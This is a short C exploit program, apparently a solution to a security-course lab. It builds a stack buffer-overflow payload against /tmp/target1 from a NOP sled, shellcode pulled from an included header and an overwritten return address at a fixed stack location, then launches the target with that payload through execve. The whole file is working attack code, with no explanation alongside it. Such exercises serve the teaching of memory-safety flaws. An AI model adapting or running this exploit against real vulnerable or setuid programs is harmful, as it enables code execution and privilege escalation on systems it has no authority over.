#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define PAYLOAD_SIZE (256+4+4+4+4+1)
#define NOP (0x90)
#define RET_ADDR (0xbffffc30)

int main(void)
{
    char *args[3];
    char *env[1];

    char payload[PAYLOAD_SIZE];

    /* Build payload */
    memset(payload, NOP, PAYLOAD_SIZE);
    payload[PAYLOAD_SIZE-1] = '\0';
    memcpy(payload, shellcode, strlen(shellcode));
    *(int *)(payload + PAYLOAD_SIZE - 1 - 4) = RET_ADDR;


    args[0] = TARGET;
    args[1] = payload;
    args[2] = NULL;
    env[0] = NULL;

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
